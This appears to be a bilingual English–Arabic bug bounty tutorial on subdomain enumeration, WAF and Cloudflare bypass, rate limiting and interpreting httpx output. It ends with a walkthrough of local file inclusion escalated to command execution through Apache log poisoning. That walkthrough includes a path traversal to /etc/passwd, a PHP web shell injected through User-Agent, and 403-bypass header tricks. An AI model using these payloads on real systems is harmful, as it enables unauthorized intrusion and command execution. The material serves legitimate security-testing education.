🧩 Edge Cases & FAQ

🤔 What if the scope is too large?▼
Focus on recently acquired assets and new features. Check acquisition history on Crunchbase. New subdomains and recently deployed services are most likely to have bugs.
🛡️ What if all subdomains are behind WAF?▼
Try origin IP discovery using Shodan, Censys, or SecurityTrails. Check historical DNS records on DNS Dumpster. Some WAFs can be bypassed with HTTP/2 downgrades or chunked encoding.
🔍 What if no vulnerabilities are found?▼
Switch to API testing — many programs have undocumented APIs. Check mobile app endpoints using MobSF. Try business logic bugs (race conditions, coupon abuse, privilege escalation).
⏰ When should I abandon a target?▼
After 8+ hours with zero interesting findings, move on. Keep notes for later. Sometimes coming back after a few weeks with fresh eyes reveals what you missed.
🚫 How to handle rate limiting?▼
Add delays between requests (--rate-limit flags). Rotate source IPs if possible. Switch to manual testing in Burp. Some targets accept higher rates during off-peak hours.

Subdomain Enumeration

Build your full attack surface before touching the target — as used in real Bug Bounty

🟠 Medium ⏱ 20-40 min 🔧 subfinder · amass · httpx · nuclei 💰 $500 → $5,000
📖 What is it?

عملية اكتشاف كل النطاقات الفرعية المرتبطة بالهدف من مصادر OSINT خارجية أو DNS نشط — بدون لمس الـ target مباشرة.

🎯 Goal

بناء أوسع Attack Surface ممكن. كل subdomain = نقطة دخول: Takeover / Admin panel / Dev environment / API مكشوف.

💡 Edge Cases — ماذا تفعل لو؟

💡 What-If Scenarios & Edge Cases

❓ Scenario 1: كل النطاقات الفرعية خلف Cloudflare؟ (Behind Cloudflare CDN)

• الحل: ابحث عن الـ Origin IP الحقيقي للسيرفر لتخطي الحماية. استخدم أدوات مثل Shodan أو Censys للبحث عن الشهادة التاريخية، أو فحص سجلات DNS التاريخية (DNSTrails) لرصد IP السيرفر قبل تفعيل Cloudflare.

❓ Scenario 2: الـ Scope محدد بنطاق واحد فقط ولا يسمح بـ Wildcard؟ (Single Target Only)

• الحل: ركّز بالكامل على تخمين المجلدات والملفات (Directory Discovery)، فحص ثغرات المدخلات والمعاملات (Parameters Discovery)، وقراءة ملفات الـ JS بدقة للعثور على API endpoints داخل نفس النطاق.

❓ Scenario 3: البرنامج يمنع الفحص التلقائي تماماً؟ (No Automated Scans Allowed)

• الحل: اعتمد 100% على الـ OSINT السلبي والتصفح اليدوي عبر المتصفح مع تفعيل Burp Suite للاستماع فقط (Passive Interception). قم بتحليل طلبات التطبيق العادية دون إرسال طلبات فحص مكثفة.

🛡️ Ethical Boundaries & Risk Management — أخلاقيات وجودة الفحص

🛡️ Ethical Boundaries & DoS Prevention

لتجنب التسبب في هجمات حرمان الخدمة (DoS) غير المقصودة وتفادي حظر عنوان الـ IP الخاص بك من قبل جدران الحماية (WAF):

  • التحكم بالـ Rate Limiting: حدد عدد الطلبات في الثانية عند استخدام httpx أو ffuf (مثلاً استخدام علم -t 10 أو -rate-limit 15).
  • تجنب فحص ملفات ضخمة: لا تشغل فحصاً تلقائياً بمجلدات ضخمة جداً (wordlists تزيد عن 50 ألف سطر) على السيرفرات الضعيفة.
  • احترم ملف الـ robots.txt: اقرأه يدوياً قبل الفحص لتفادي الضغط على المسارات المستبعدة.

📊 Output Interpretation — تحليل وتفسير النتائج

📊 How to Read & Analyze httpx Output

بفرض أنك حصلت على المخرجات التالية من أداة httpx:

https://dev.target.com [200] [DevEnv - Internal] [PHP/8.1, nginx/1.18]
• [PHP/8.1]: إشارة فورية لوجود لغة PHP بإصدار 8.1. ابحث فوراً عن CVEs معروفة لهذا الإصدار (مثال: RCE ثغرة PHP 8.1.0-dev backdoor).
• [nginx/1.18]: ابحث عن أخطاء التكوين الشائعة في خوادم nginx مثل Nginx Alias Traversal أو استغلال الصلاحيات في ملف التكوين.
• ماذا لو حصلت على [403 Forbidden]؟ لا تترك النطاق! جرب تخطي جدار الحماية (WAF Bypass) عبر تغيير الـ Headers (مثل X-Forwarded-For: 127.0.0.1) أو استخدام مسارات بديلة مثل /admin/..;/.

🎯 Scenario Overview (ملخص السيناريو)

⚙️ Step-by-Step Walkthrough (خطوات السيناريو)

  • 1. اكتشاف قراءة الملفات (Discovery):

    طلبنا الرابط التالي لقراءة ملف passwd الخاص بالنظام:

    /view.php?file=../../../../etc/passwd
  • 2. تحديد سجلات خادم أباتشي (Finding Access Logs):

    حاولنا قراءة سجلات الخادم Apache Access Logs للتأكد من إمكانية الوصول لها وقراءتها:

    /view.php?file=../../../../var/log/apache2/access.log
  • 3. تسميم السجلات (Poisoning the User-Agent):

    أرسلنا طلباً عادياً للموقع وقمنا بحقن كود PHP خبيث داخل ترويسة User-Agent ليتم تسجيله في الـ logs:

    User-Agent: <?php system($_GET[\'cmd\']); ?>
  • 4. تنفيذ الأوامر (Command Execution):

    الآن، استدعينا ملف السجلات المسموم مع تمرير المتغير cmd لتشغيل أوامر النظام بنجاح:

    /view.php?file=../../../../var/log/apache2/access.log&cmd=id;whoami
